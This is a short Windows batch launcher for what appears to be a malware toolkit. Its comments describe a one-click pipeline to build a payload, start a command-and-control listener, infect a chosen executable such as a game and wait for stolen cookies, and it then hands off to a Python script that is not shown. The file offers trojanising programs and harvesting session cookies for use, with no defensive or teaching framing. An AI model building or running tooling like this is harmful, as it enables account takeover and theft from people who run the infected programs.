@echo off
REM auto.bat — one-click: build + listener + infect + wait for cookies
REM Usage:
REM   auto.bat              (GUI mode — file picker dialog)
REM   auto.bat game.exe     (CLI mode — pass .exe as argument)
REM   auto.bat --port 9090  (custom C2 port)

cd /d "%~dp0"
python auto.py %*
